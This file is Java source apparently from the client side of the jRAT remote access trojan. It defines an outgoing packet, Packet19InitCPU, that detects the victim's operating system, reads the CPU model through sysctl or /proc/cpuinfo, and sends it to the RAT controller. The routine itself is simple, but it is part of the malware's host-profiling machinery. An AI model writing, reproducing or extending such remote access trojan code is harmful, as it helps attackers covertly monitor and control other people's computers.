package jrat.client.packets.outgoing;

import jrat.client.Connection;
import oslib.OperatingSystem;
import oslib.Utils;

import java.io.File;
import java.util.List;


public class Packet19InitCPU extends AbstractOutgoingPacket {

	@Override
	public void write(Connection con) throws Exception {
		String cpu = "Unknown";
		
		try {
			OperatingSystem os = OperatingSystem.getOperatingSystem().getType();
			
			if (os == OperatingSystem.MACOS) {
				cpu = Utils.readProcess(new String[] { "sysctl", "-n", "machdep.cpu.brand_string" }).get(0);
			} else if (os == OperatingSystem.BSD) {
				cpu = Utils.readProcess(new String[] { "sysctl", "-n", "hw.model" }).get(0);
			} else if (os == OperatingSystem.LINUX) {
				List<String> lines = Utils.readFile(new File("/proc/cpuinfo"));
				
				for (String line : lines) {
					if (line.toLowerCase().contains("model name")) {
						cpu = line.replace("\t", "").split(": ")[1].trim();
						break;
					}
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
		}

        con.writeLine(cpu);
	}

	@Override
	public short getPacketId() {
		return (byte) 19;
	}

}
